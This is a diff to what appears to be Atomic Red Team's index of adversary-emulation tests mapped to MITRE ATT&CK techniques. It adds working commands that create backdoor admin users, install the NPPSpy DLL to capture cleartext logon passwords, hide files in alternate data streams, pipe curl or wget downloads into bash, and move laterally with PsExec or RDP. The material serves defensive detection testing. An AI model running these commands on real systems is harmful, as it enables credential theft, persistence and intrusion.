@@ -11955,14 +11955,38 @@ persistence:
           type: String
           default: BetterWithButter
       executor:
-        command: "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release
-          | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" |
-          sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;
-          \     \n"
+        command: |
+          useradd -g 0 -M -d /root -s /bin/bash #{username}
+          if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "#{username}:#{password}" | sudo chpasswd; else echo "#{password}" | passwd --stdin #{username}; fi;
         cleanup_command: 'userdel #{username}
 
 '
         name: bash
+        elevation_required: true
+    - name: Create a new Windows admin user
+      auto_generated_guid: fda74566-a604-4581-a4cc-fbbe21d66559
+      description: 'Creates a new admin user in a command prompt.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        username:
+          description: Username of the user to create
+          type: String
+          default: T1136.001_Admin
+        password:
+          description: Password of the user to create
+          type: String
+          default: T1136_pass
+      executor:
+        command: |
+          net user /add "#{username}" "#{password}"
+          net localgroup administrators "#{username}" /add
+        cleanup_command: 'net user /del "#{username}" >nul 2>&1
+
+'
+        name: command_prompt
         elevation_required: true
   T1078.003:
     technique:
@@ -18684,6 +18708,43 @@ credential-access:
       executor:
         command: "#{gsecdump_exe} -a\n"
         name: command_prompt
+        elevation_required: true
+    - name: Credential Dumping with NPPSpy
+      auto_generated_guid: 9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6
+      description: |-
+        Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.
+        After user's logging in cleartext password is saved in C:\NPPSpy.txt.
+        Clean up deletes the files and reverses Registry changes.
+        NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: NPPSpy.dll must exist in PathToAtomicsFolder\T1003\bin directory
+        prereq_command: if (Test-Path "PathToAtomicsFolder\T1003\bin\NPPSpy.dll")
+          {exit 0} else {exit 1}
+        get_prereq_command: |-
+          $rv = mkdir PathToAtomicsFolder\T1003\bin
+          Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "PathToAtomicsFolder\T1003\bin\NPPSpy.dll"
+      executor:
+        command: |-
+          Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
+          $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
+          $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
+          Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
+          $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
+          $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
+          $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
+          $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
+          $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
+          echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
+        cleanup_command: "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\"
+          -Name PROVIDERORDER\n$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER \n$cleanupUpdatedValue
+          = $cleanupUpdatedValue -replace ',NPPSpy',''\nSet-ItemProperty -Path $cleanupPath.PSPath
+          -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue\nRemove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\"
+          -Recurse -ErrorAction Ignore\nRemove-Item C:\\NPPSpy.txt -ErrorAction Ignore\nRemove-Item
+          C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore"
+        name: powershell
         elevation_required: true
   T1110.002:
     technique:
@@ -27076,17 +27137,15 @@ defense-evasion:
           type: path
           default: c:\ADS\
       executor:
-        command: |
-          type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
-          extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
-          findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
-          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
-          makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
-          print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
-          reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
-          regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
-          expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
-          esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
+        command: "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32
+          #{path}\\procexp.cab #{path}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump
+          #{path}\\procexp.exe > #{path}\\file.txt:procexp.exe\ncertutil.exe -urlcache
+          -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1
+          c:\\temp:ttt\nmakecab #{path}\\autoruns.exe #{path}\\cabtest.txt:autoruns.cab\nprint
+          /D:#{path}\\file.txt:autoruns.exe #{path}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg
+          #{path}\\file.txt:evilreg.reg\nregedit /E #{path}\\file.txt:regfile.reg
+          HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat #{path}\\file.txt:file.bat\nesentutl.exe
+          /y #{path}\\autoruns.exe /d #{path}\\file.txt:autoruns.exe /o \n"
         name: command_prompt
         elevation_required: true
     - name: Store file in Alternate Data Stream (ADS)
@@ -36585,25 +36644,23 @@ discovery:
       supported_platforms:
       - windows
       input_arguments:
-        file_name:
-          description: defining NMap install exe
-          type: path
-          default: "$env:temp\\nmap-7.80-setup.exe"
         nmap_url:
-          description: defining nmap download url
+          description: NMap installer download URL
           type: url
           default: https://nmap.org/dist/nmap-7.80-setup.exe
+        host_to_scan:
+          description: The host to scan with NMap
+          type: string
+          default: 127.0.0.1
       dependency_executor_name: powershell
       dependencies:
-      - description: 'NMap must be installed at #{file_name}'
-        prereq_command: if (cmd /c "where nmap >nul 2>&1") {exit 0} else {exit 1}
+      - description: NMap must be installed
+        prereq_command: if (cmd /c nmap 2>nul) {exit 0} else {exit 1}
         get_prereq_command: |-
-          Invoke-WebRequest -OutFile "#{file_name}" #{nmap_url}
-          Start-Process #{file_name} /S
+          Invoke-WebRequest -OutFile $env:temp\nmap-7.80-setup.exe #{nmap_url}
+          Start-Process $env:temp\nmap-7.80-setup.exe /S
       executor:
-        command: nmap 127.0.0.1
-        cleanup_command: "try {Start-Process 'C:\\Program Files (x86)\\Nmap\\Uninstall.exe'
-          \"/S\"} catch{} \nRemove-Item #{file_name} -erroraction ignore"
+        command: 'nmap #{host_to_scan}'
         name: powershell
         elevation_required: true
   T1135:
@@ -38724,8 +38781,8 @@ execution:
       - linux
       executor:
         command: |
-          curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
-          wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/echo-art-fish.sh | bash
+          curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
+          wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
         cleanup_command: 'rm /tmp/art-fish.txt
 
 '
@@ -40649,7 +40706,7 @@ execution:
           New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
-        command: '#{psexec_exe} \\#{remote_host} "C:\Windows\System32\calc.exe"
+        command: '#{psexec_exe} \\#{remote_host} -accepteula "C:\Windows\System32\calc.exe"
 
 '
         name: powershell
@@ -41990,8 +42047,7 @@ lateral-movement:
         elevation_required: true
     - name: RDPto-DomainController
       auto_generated_guid: 355d4632-8cb9-449d-91ce-b566d0253d3e
-      description: 'Attempt an RDP session via "Connect-RDP" to a system. Default
-        RDPs to (%logonserver%) as the current user
+      description: 'Attempt an RDP session via Remote Desktop Application to a DomainController.
 
 '
       supported_platforms:
@@ -42001,10 +42057,18 @@ lateral-movement:
           description: ComputerName argument default %logonserver%
           type: String
           default: $ENV:logonserver.TrimStart("\")
-        username:
-          description: Username argument default %USERDOMAIN%\%username%
+        domain:
+          description: domain argument default %USERDOMAIN%
           type: String
-          default: "$Env:USERDOMAIN\\$ENV:USERNAME"
+          default: "$Env:USERDOMAIN"
+        username:
+          description: Username argument default %username%
+          type: String
+          default: "$ENV:USERNAME"
+        password:
+          description: Password
+          type: String
+          default: 1password2!
       dependencies:
       - description: Computer must be domain joined
         prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
@@ -42012,9 +42076,48 @@ lateral-movement:
         get_prereq_command: Write-Host Joining this computer to a domain must be done
           manually
       executor:
-        command: 'Connect-RDP -ComputerName #{logonserver} -User #{username}
+        command: |
+          $Server=#{logonserver}
+          $User = Join-Path #{domain} #{username}
+          $Password="#{password}"
+          cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
+          mstsc /v:$Server
+          echo "RDP connection established"
+        cleanup_command: |
+          $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
+          if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
+        name: powershell
+    - name: RDP to Server
+      auto_generated_guid: 7382a43e-f19c-46be-8f09-5c63af7d3e2b
+      description: 'Attempt an RDP session via Remote Desktop Application over Powershell
 
 '
+      supported_platforms:
+      - windows
+      input_arguments:
+        logonserver:
+          description: ComputerName
+          type: String
+          default: WIN-DC
+        username:
+          description: Username
+          type: String
+          default: Administrator
+        password:
+          description: Password
+          type: String
+          default: 1password2!
+      executor:
+        command: |
+          $Server="#{logonserver}"
+          $User="#{username}"
+          $Password="#{password}"
+          cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
+          mstsc /v:$Server
+          echo "RDP connection established"
+        cleanup_command: |
+          $p=Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
+          if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
         name: powershell
   T1563:
     technique:
@@ -42323,7 +42426,7 @@ lateral-movement:
           type: String
           default: "\\\\localhost"
       executor:
-        command: 'psexec.exe #{remote_host} -c #{command_path}
+        command: 'psexec.exe #{remote_host} -accepteula -c #{command_path}
 
 '
         name: command_prompt
@@ -42941,8 +43044,8 @@ lateral-movement:
           New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
-        command: "#{psexec_exe} \\\\#{computer_name} -u #{user_name} -p #{password}
-          -s cmd.exe\n"
+        command: "#{psexec_exe} \\\\#{computer_name} -accepteula -u #{user_name} -p
+          #{password} -s cmd.exe\n"
         name: command_prompt
     - name: Invoke-Command
       auto_generated_guid: 5295bd61-bd7e-4744-9d52-85962a4cf2d6
